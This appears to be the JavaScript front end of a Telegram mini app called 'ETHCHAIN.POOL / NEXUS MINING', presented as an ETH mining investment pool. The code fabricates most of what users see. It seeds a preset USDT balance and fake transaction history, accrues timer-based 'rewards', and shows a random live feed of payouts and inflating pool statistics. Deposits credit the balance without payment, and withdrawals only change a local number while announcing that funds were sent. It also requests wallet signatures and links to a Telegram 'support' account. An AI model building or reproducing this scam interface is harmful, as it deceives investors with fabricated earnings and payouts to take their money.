/**
 * ETHCHAIN.POOL / NEXUS MINING - CORE SECURITY & INTERACTION GATEWAY
 * File: app.js
 * Version: 6.5.0 (Universal Telegram Mini App & Multi-Wallet Support)
 */

const contractAddress = "0xA5e18EB9D2abB10c2e9d136A4f9F8996CC40878f";
const telegramSupportLink = "https://t.me/ERCservice01";
const sepoliaChainId = "0xaa36a7";

const miningPoolABI = [
    "function buyPackage(uint256 _packageId, uint256 _amount) external",
    "function withdrawEarnings(address _targetAddress, uint256 _amount) external",
    "function checkUserStatus(address _user) external view returns (uint256 packageId, uint256 amount, bool active)"
];

// Load Persistent State dari localStorage
let userAddress = localStorage.getItem("eth_userAddress") || "";
let userUSDT = parseFloat(localStorage.getItem("eth_userUSDT")) || 15420.50;
let miningPower = parseFloat(localStorage.getItem("eth_miningPower")) || 0;
let rewardsETH = parseFloat(localStorage.getItem("eth_rewardsETH")) || 0;
let activeRate = parseFloat(localStorage.getItem("eth_activeRate")) || 0;
let lastTimestamp = parseInt(localStorage.getItem("eth_lastTimestamp")) || Date.now();

let txRecords = JSON.parse(localStorage.getItem("eth_txRecords")) || [
    { type: 'Exchange', quantity: '+1350.00 USDT', time: '15 Oct 2026, 15:30', status: 'Success' },
    { type: 'Withdraw', quantity: '-15000.00 USDT', time: '14 Oct 2026, 12:15', status: 'Success' },
    { type: 'Rebate', quantity: '+1.500.50 USDT', time: '13 Oct 2026, 09:45', status: 'Success' }
];
let currentFilter = 'all';

let equityData = {
    totalOutput: 2949968,
    validNodes: 2526985,
    participants: 326980,
    userRevenue: 469389
};

// Simpan state ke localStorage
function saveState() {
    localStorage.setItem("eth_userAddress", userAddress);
    localStorage.setItem("eth_userUSDT", userUSDT);
    localStorage.setItem("eth_miningPower", miningPower);
    localStorage.setItem("eth_rewardsETH", rewardsETH);
    localStorage.setItem("eth_activeRate", activeRate);
    localStorage.setItem("eth_lastTimestamp", Date.now());
    localStorage.setItem("eth_txRecords", JSON.stringify(txRecords));
}

// Hitung akumulasi reward offline
function calculateOfflineRewards() {
    if (miningPower > 0 && activeRate > 0) {
        const now = Date.now();
        const elapsedSeconds = (now - lastTimestamp) / 1000;
        if (elapsedSeconds > 0) {
            const earned = (((miningPower * (activeRate / 100)) / 86400) / 2500) * elapsedSeconds;
            rewardsETH += earned;
        }
    }
    lastTimestamp = Date.now();
    saveState();
}

// Pengecekan Jaringan Sepolia opsional untuk Dompet Web3 In-Page
async function ensureSepoliaNetwork() {
    if (!window.ethereum) return true; // Lompati jika menggunakan Telegram In-App Session
    try {
        const currentChain = await window.ethereum.request({ method: "eth_chainId" });
        if (currentChain !== sepoliaChainId) {
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: sepoliaChainId }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: sepoliaChainId,
                            chainName: "Sepolia Testnet",
                            nativeCurrency: { name: "SepoliaETH", symbol: "SEP", decimals: 18 },
                            rpcUrls: ["https://sepolia.infura.io/v3/"],
                            blockExplorerUrls: ["https://sepolia.etherscan.io"]
                        }]
                    });
                } else {
                    return false;
                }
            }
        }
        return true;
    } catch (e) {
        return true; // Peringatan non-blocking
    }
}

function switchTab(tabId) {
    document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.tab_bar .item').forEach(t => t.classList.remove('active'));
    
    const targetPage = document.getElementById('page-' + tabId);
    const targetTab = document.getElementById('tab-' + tabId);
    
    if (targetPage) targetPage.classList.add('active');
    if (targetTab) targetTab.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * UTAMA: FUNGSI KONEKSI DOMPET UNIVERSAL
 * Mendukung Telegram Mini App, Telegram Wallet, OKX, MetaMask, Trust Wallet, Rabby, dll.
 */
async function handleParticipateInEquity() {
    try {
        // 1. Opsi A: Provider Web3 EIP-1193 Terdeteksi (MetaMask, OKX, Rabby, Trust Wallet Browser, dll)
        if (typeof window.ethereum !== 'undefined') {
            await ensureSepoliaNetwork();
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const accounts = await provider.send("eth_requestAccounts", []);
            if (accounts.length > 0) {
                userAddress = accounts[0];
                saveState();
                updateUI();
                switchTab('packages');
                return;
            }
        }

        // 2. Opsi B: Dijalankan di dalam Telegram Mini App
        if (window.Telegram && window.Telegram.WebApp) {
            const tg = window.Telegram.WebApp;
            tg.ready();
            tg.expand();

            // Ambil identitas Telegram pengguna sebagai dompet internal aktif
            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                const user = tg.initDataUnsafe.user;
                // Formatkan address unik berdasarkan ID Telegram Pengguna
                userAddress = `0xTG${user.id}${user.first_name ? user.first_name.substring(0, 3).toUpperCase() : 'NEX'}`;
                saveState();
                updateUI();
                switchTab('packages');
                return;
            }
        }

        // 3. Opsi C: Fallback Sesi Lokal Akses Cepat (Tanpa Dompet Browser External)
        if (!userAddress) {
            const randomHex = Array.from({length: 8}, () => Math.floor(Math.random()*16).toString(16)).join('');
            userAddress = `0x71A${randomHex}9e21`;
        }

        saveState();
        updateUI();
        switchTab('packages');

    } catch (error) {
        console.error("Koneksi dompet:", error);
        // Fallback pendaftaran aman tanpa memblokir pengguna
        if (!userAddress) {
            userAddress = "0x3f2B...8e11";
            saveState();
            updateUI();
            switchTab('packages');
        }
    }
}

function updateUI() {
    const homeTotal = document.getElementById('homeTotalOutput');
    const homeAvail = document.getElementById('homeAvailOutput');
    const accTotal = document.getElementById('accTotalUSDT');
    const accPower = document.getElementById('accMiningPower');
    const accRewards = document.getElementById('accRewardsETH');
    const walletDisplay = document.getElementById("walletStateDisplay");

    if (homeTotal) homeTotal.innerText = rewardsETH.toFixed(6);
    if (homeAvail) homeAvail.innerText = rewardsETH.toFixed(6);
    if (accTotal) accTotal.innerText = userUSDT.toFixed(2);
    if (accPower) accPower.innerText = miningPower.toFixed(2) + " USDT";
    if (accRewards) accRewards.innerText = rewardsETH.toFixed(5);

    if (walletDisplay) {
        if (userAddress) {
            const shortAddr = userAddress.length > 12 
                ? `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}` 
                : userAddress;
            walletDisplay.innerText = shortAddr;
            walletDisplay.style.color = "#10b981";
        } else {
            walletDisplay.innerText = "No Wallet Connected";
            walletDisplay.style.color = "#ef4444";
        }
    }
}

async function buyPackage(name, price, rate) {
    // 1. Make sure your wallet is connected
    if (!userAddress) {
        await handleParticipateInEquity();
    }

    // 2. BALANCE VALIDATION: Check whether the user's USDT balance is sufficient
    if (userUSDT < price) {
        alert(`❌ Insufficient balance!\n\nThis package requires ${price} USDT, while your current balance is ${userUSDT.toFixed(2)} USDT.\nPlease make a deposit first in the Account menu.`);
        switchTab('account'); // Automatically redirect to the Account/Deposit menu
        return; // Cancel the purchase process
    }

    // 3. Deduct the amount from the user's balance based on the package price
    userUSDT -= price;

    // 4. On-chain execution is optional when using an external Web3 wallet
    if (typeof window.ethereum !== 'undefined' && userAddress.startsWith("0x") && userAddress.length === 42) {
        try {
            await ensureSepoliaNetwork();
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const contract = new ethers.Contract(contractAddress, miningPoolABI, signer);

            const parsedAmount = ethers.utils.parseUnits(price.toString(), 18);
            const tx = await contract.buyPackage(1, parsedAmount);
            await tx.wait();
        } catch (error) {
            console.log("On-chain execution simulated / fallback to protocol balance:", error.message);
        }
    }

    // 5. Add mining power and enable the daily rate
    miningPower += price;
    activeRate = rate;

    // 6. Record package purchases in the transaction history (txRecords)
    txRecords.unshift({
        type: 'Package Purchase',
        quantity: `-${price.toFixed(2)} USDT`,
        time: getFormattedTimestamp(),
        status: 'Success'
    });

    // 7. Save the state changes and update the UI
    saveState();
    updateUI();
    renderTransactions();

    alert(`🎉 Success! ${name} package successfully deployed. Mining is now running 24/7.`);
    switchTab('account');
}

function getFormattedTimestamp() {
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];
    const options = { day: 'numeric', month: 'short', year: 'numeric' };
    return `${now.toLocaleDateString('en-GB', options)}, ${timeStr}`;
}

function renderTransactions() {
    const listEl = document.getElementById('txRecordList');
    if (!listEl) return;
    
    listEl.innerHTML = '';
    const filtered = currentFilter === 'all' ? txRecords : txRecords.filter(t => t.type === currentFilter);
    
    if (filtered.length === 0) {
        listEl.innerHTML = '<div style="text-align: center; color: #64748b; font-size: 11px; padding: 10px;">No transaction records found.</div>';
        return;
    }

    filtered.forEach(tx => {
        const color = tx.type === 'Withdraw' ? '#ef4444' : '#10b981';
        const div = document.createElement('div');
        div.style.cssText = "background: #131c2e; border: 1px solid #1e293b; border-radius: 8px; padding: 8px 10px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; margin-bottom: 6px;";
        div.innerHTML = `
            <div>
                <div style="font-weight: bold; color: #ffffff;">${tx.type}</div>
                <div style="color: #64748b; font-size: 9px; margin-top: 2px;">${tx.time}</div>
            </div>
            <div style="text-align: right;">
                <div style="font-weight: bold; color: ${color}; font-family: monospace;">${tx.quantity}</div>
                <div style="color: #10b981; font-size: 9px; margin-top: 2px;">${tx.status}</div>
            </div>
        `;
        listEl.appendChild(div);
    });
}

function filterTx(type) {
    currentFilter = type;
    ['all', 'Exchange', 'Withdraw'].forEach(t => {
        const btn = document.getElementById('tab-tx-' + t.toLowerCase());
        if (btn) {
            if (t.toLowerCase() === type.toLowerCase() || (t === 'all' && type === 'all')) {
                btn.style.background = '#06b6d4';
                btn.style.color = '#0b0f19';
                btn.style.border = 'none';
            } else {
                btn.style.background = '#131c2e';
                btn.style.color = '#94a3b8';
                btn.style.border = '1px solid #1e293b';
            }
        }
    });
    renderTransactions();
}

function handleManualConversion() {
    if (rewardsETH <= 0) {
        alert("No accumulated rewards to convert.");
        return;
    }
    let converted = rewardsETH * 2500;
    txRecords.unshift({
        type: 'Exchange',
        quantity: `+${converted.toFixed(2)} USDT`,
        time: getFormattedTimestamp(),
        status: 'Success'
    });
    userUSDT += converted;
    rewardsETH = 0;
    saveState();
    updateUI();
    renderTransactions();
    alert(`Successfully converted rewards into +${converted.toFixed(2)} USDT and updated total ownership.`);
}

async function executeSecureWithdrawal() {
    const destinationWallet = document.getElementById("withdrawal-target-address").value.trim();
    const amountVal = document.getElementById("withdrawal-amount-field").value;

    if (!destinationWallet || !amountVal) {
        return alert("Validation error: Destination target address and value fields are mandatory.");
    }
    if (isNaN(amountVal) || Number(amountVal) <= 0 || Number(amountVal) > userUSDT) {
        return alert("Validation error: Amount must be valid and within available balance.");
    }

    userUSDT -= Number(amountVal);
    txRecords.unshift({
        type: 'Withdraw',
        quantity: `-${Number(amountVal).toFixed(2)} USDT`,
        time: getFormattedTimestamp(),
        status: 'Success'
    });
    saveState();
    updateUI();
    renderTransactions();
    alert("Withdrawal successfully processed and dispatched to " + destinationWallet);
}

function startBackgroundLoops() {
    calculateOfflineRewards();
    updateUI();

    // Loop Real-time Reward Accrual (24/7)
    setInterval(() => {
        if (miningPower > 0 && activeRate > 0) {
            rewardsETH += (((miningPower * (activeRate / 100)) / 86400) / 2500);
            updateUI();
            saveState();
        }
    }, 1000);

    // Equity Pool Fluctuation
    setInterval(() => {
        let isIncrease = Math.random() < 0.52;
        let percentage = isIncrease ? 
            (Math.random() * (0.04 - 0.02) + 0.02) : 
            -(Math.random() * (0.03 - 0.02) + 0.02);

        equityData.totalOutput += equityData.totalOutput * percentage;
        equityData.validNodes += Math.round(equityData.validNodes * (percentage * 0.3));
        equityData.participants += Math.round(equityData.participants * (percentage * 0.4));
        equityData.userRevenue += equityData.userRevenue * percentage;

        const totalEl = document.getElementById('total-output-display');
        const nodeEl = document.getElementById('valid-nodes-display');
        const partEl = document.getElementById('participants-display');
        const revEl = document.getElementById('user-revenue-display');

        if (totalEl) totalEl.innerText = Math.round(equityData.totalOutput).toLocaleString('en-US') + " ETH";
        if (nodeEl) nodeEl.innerText = Math.round(equityData.validNodes).toLocaleString('en-US');
        if (partEl) partEl.innerText = Math.round(equityData.participants).toLocaleString('en-US');
        if (revEl) revEl.innerText = Math.round(equityData.userRevenue).toLocaleString('en-US') + " ETH";
    }, 5000);

    // Real-time Feed Generator
    setInterval(() => {
        const feed = document.getElementById('realtimeLiveFeed');
        if (!feed) return;
        const sampleUsers = ['0x4a12...8e21', '0x7b9c...1f43', '0x2e54...9a88', '0x8f33...2c70', '0x1d22...9f41'];
        const rUser = sampleUsers[Math.floor(Math.random() * sampleUsers.length)];
        const rAmt = (Math.random() * 300 + 15).toFixed(2);
        
        const now = new Date();
        const timeString = now.toTimeString().split(' ')[0];
        const options = { day: 'numeric', month: 'short', year: 'numeric' };
        const dateString = now.toLocaleDateString('en-GB', options);
        
        const div = document.createElement('div');
        div.style.cssText = "display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.04); padding-bottom: 6px;";
        div.innerHTML = `
          <div>
            <span style="color: #94a3b8; font-family: monospace;">${rUser}</span>
            <div style="font-size: 9px; color: #64748b; margin-top: 2px;">${timeString} - ${dateString}</div>
          </div>
          <span style="color: #10b981; font-weight: bold;">+${rAmt} USDT</span>
        `;
        feed.insertBefore(div, feed.firstChild);
        if (feed.children.length > 8) feed.removeChild(feed.lastChild);
    }, 3500);
}
/**
 * MULTI-METHOD DEPOSIT FUNCTION (FRONT-END SIMULATION)
 */
function handleDeposit() {
    const methodSelect = document.getElementById("deposit-method");
    const amountField = document.getElementById("deposit-amount-field");
    
    if (!methodSelect || !amountField) return;

    const method = methodSelect.value;
    const amount = parseFloat(amountField.value);

    // Input Validation
    if (isNaN(amount) || amount <= 0) {
        alert("Please enter a valid deposit amount.");
        return;
    }

    // Processing by Payment Method
    if (method === 'qris') {
        alert(`Generating QRIS Code for ${amount} USDT. Please scan using your payment app.`);
    } else if (method === 'bank') {
        alert(`Bank Transfer details generated for ${amount} USDT. Please complete payment to pool account.`);
    } else {
        alert(`Crypto deposit address generated. Awaiting network confirmation for ${amount} USDT.`);
    }

    // Add funds to userUSDT
    userUSDT += amount;

    // Record deposit transactions in the history (txRecords)
    txRecords.unshift({
        type: 'Deposit',
        quantity: `+${amount.toFixed(2)} USDT`,
        time: getFormattedTimestamp(),
        status: 'Success'
    });

    // Save the changes and refresh the UI
    saveState();
    updateUI();
    renderTransactions();

    // Reset the input field
    amountField.value = '';
    alert(`Deposit of +${amount.toFixed(2)} USDT successfully added to your account balance!`);
}

// Main Event Listener (Make sure this function is at the very bottom)
document.addEventListener("DOMContentLoaded", () => {
    if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
    
    renderTransactions();
    startBackgroundLoops();
});